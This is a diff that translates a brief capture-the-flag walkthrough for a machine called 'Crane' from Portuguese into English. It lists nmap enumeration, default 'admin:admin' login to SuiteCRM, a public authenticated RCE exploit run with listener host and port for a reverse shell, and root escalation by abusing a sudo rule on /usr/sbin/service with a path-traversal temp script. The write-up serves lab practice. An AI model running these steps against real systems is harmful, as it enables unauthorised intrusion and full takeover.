@@ -1,31 +1,31 @@
 # Crane
 > SuiteCRM RCE + sudo service
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
 ```
 
-SuiteCRM identificado na porta 80.
+SuiteCRM identified on port 80.
 
-## Exploração
+## Exploitation
 
-Credenciais padrão `admin:admin` funcionam. SuiteCRM versão vulnerável a RCE autenticado:
+Default credentials `admin:admin` work. SuiteCRM version vulnerable to authenticated RCE:
 
 ```
 searchsploit suitecrm
 ```
 
-Upload de webshell via módulo de relatórios ou exploit público:
+Webshell upload via reports module or public exploit:
 
 ```
 python3 exploit.py -u http://<IP> --user admin --pass admin --lhost <IP> --lport <PORTA>
 ```
 
-Reverse shell como www-data.
+Reverse shell as www-data.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
 ```
 sudo -l
@@ -35,7 +35,7 @@ sudo -l
 (root) NOPASSWD: /usr/sbin/service
 ```
 
-Execução de serviço controlável:
+Controllable service execution:
 
 ```
 TF=$(mktemp).sh
@@ -44,4 +44,4 @@ chmod +x $TF
 sudo service ../../tmp/$(basename $TF) start
 ```
 
-Root obtido.
+Root obtained.
